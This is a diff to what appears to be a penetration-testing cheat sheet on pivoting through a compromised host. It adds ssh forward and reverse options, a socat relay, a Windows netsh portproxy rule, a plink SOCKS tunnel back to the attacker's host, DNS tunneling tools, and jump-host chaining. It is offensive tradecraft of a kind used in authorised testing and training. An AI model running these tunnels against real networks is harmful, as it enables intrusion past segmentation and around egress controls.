@@ -32,10 +32,17 @@ your attack host can reach internal services as if it were on that subnet.
      a clean interface — all tools work natively, no proxychains.
    - **chisel**: `chisel server --reverse` on you, `chisel client ... R:socks` on target → SOCKS.
    - **sshuttle**: if you have SSH creds — `sshuttle -r user@A 10.10.0.0/16` (VPN-like, simple).
-   - **ssh -L/-D**: local/dynamic forwards for one-off ports or a quick SOCKS proxy.
+   - **ssh -L/-D**: local/dynamic forwards for one-off ports or a quick SOCKS proxy
+     (`-L 8080:internal:80`, `-D 1080` for SOCKS, `-R` to expose your listener to the target).
+   - **socat relay**: on the foothold, `socat TCP-LISTEN:9999,fork TCP:internal:80` forwards a single
+     internal port — handy when only socat is present.
+   - **Windows foothold, no SSH**: built-in `netsh interface portproxy add v4tov4 listenport=8080
+     connectaddress=<internal> connectport=80`, or `plink.exe -D 1080 user@$LHOST` for SOCKS.
+   - **DNS/ICMP egress only**: when TCP is fully filtered, tunnel over DNS (`dnscat2`, `iodine`).
 3. **Route tools**: with ligolo, just target the internal IP; with SOCKS, prefix `proxychains`
    (set the port in `/etc/proxychains4.conf`) — note UDP/ICMP don't traverse SOCKS.
-4. **Chain hops**: repeat from B to reach a third subnet (double pivot).
+4. **Chain hops**: repeat from B to reach a third subnet (double pivot). `ssh -J` chains jump hosts;
+   ligolo just adds another route.
 
 ## Gotchas
 - proxychains + nmap: use `-sT` (TCP connect) and skip ping (`-Pn`); SYN scans won't tunnel.
